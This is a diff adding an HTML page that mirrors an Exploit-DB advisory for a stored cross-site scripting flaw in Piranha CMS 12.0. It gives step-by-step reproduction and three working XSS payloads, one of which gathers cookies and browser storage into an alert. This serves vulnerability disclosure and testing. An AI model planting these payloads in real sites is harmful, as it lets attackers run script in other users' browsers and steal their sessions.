@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OffSec’s Exploit Database Archive</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.5em; }
+  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
+  img { max-width: 100%; height: auto; border-radius: 8px; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 1em; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
+</style>
+</head>
+<body>
+  <h1>OffSec’s Exploit Database Archive</h1>
+  <div class="metadata">
+    Source: Exploit-DB | Date: 2/2/2026 | Lang: EN |
+    <a href="https://www.exploit-db.com/exploits/52471" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div>
+
+                        
+                        <pre><code># Exploit Title: Piranha CMS 12.0 - Stored Cross Site Scripting 
+# Date: 2025-09-26
+# Exploit Author: Chidubem Chukwu (Terminal Venom)
+# LinkedIn : https://www.linkedin.com/in/chidubem-chukwu-20bb202a9?
+# Vendor Homepage: https://piranhacms.org
+# Software Link: https://github.com/PiranhaCMS/piranha.core/releases/tag/v12.0
+# Version: 12.0
+# Category: Web Application
+# Tested on: Ubuntu 22.04, Piranha CMS v12.0 (local), Chrome 
+# CVE: CVE-2025-57692
+# Privilege Level: authenticated user
+# Patched Version: Not available
+# Exploit link: https://github.com/Saconyfx/security-advisories/blob/main/CVE-2025-57692/advisory.md
+
+
+
+
+## Reproduction Steps ##
+
+PiranhaCMS 12.0 allows stored XSS in the Text content block of Standard and Standard Archive Pages via /manager/pages, enabling execution of arbitrary JavaScript in another user s browser.
+
+Reproduction steps 
+
+	1.	Log in to the Piranha admin panel at https://&lt;host&gt;/manager/login.
+
+	2.	Navigate to Pages.
+
+	3.	Click Add Page and choose Standard Page or Standard Archive.
+
+	4.	Enter a page title (e.g., XSS-Test).
+
+	5.	Click the [ + ] button and select Text under Content to add a Text block.
+
+	6.	In the Text block input area, paste one of the payloads below (paste directly into the editor and save). The payload will execute immediately when pasted/saved and will also execute for anyone who later accesses or previews the page.
+
+Payload A 
+
+&lt;img src="x" onerror="
+  alert(
+    'Cookies: ' + document.cookie + '\n' +
+    'LocalStorage: ' + JSON.stringify(localStorage) + '\n' +
+    'SessionStorage: ' + JSON.stringify(sessionStorage) + '\n' +
+    'URL: ' + window.location.href + '\n' +
+    'User Agent: ' + navigator.userAgent + '\n' +
+    'Time: ' + new Date().toLocaleString()
+  )
+" /&gt;
+
+Payload B — iframe base64 
+
+&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt;
+
+Payload C — details toggle (on-toggle alert)
+
+&lt;details open ontoggle=alert('XSS')&gt;Click&lt;/details&gt;
+
+	7.	Click Save. The payload executes immediately upon save (and will execute again when the page is previewed or accessed by others).
+
+	8.	Anyone who accesses the page (or pastes the payload) will trigger the XSS.
+            </code></pre>
+
+                    </div></div>
+  </div>
+</body>
+</html>
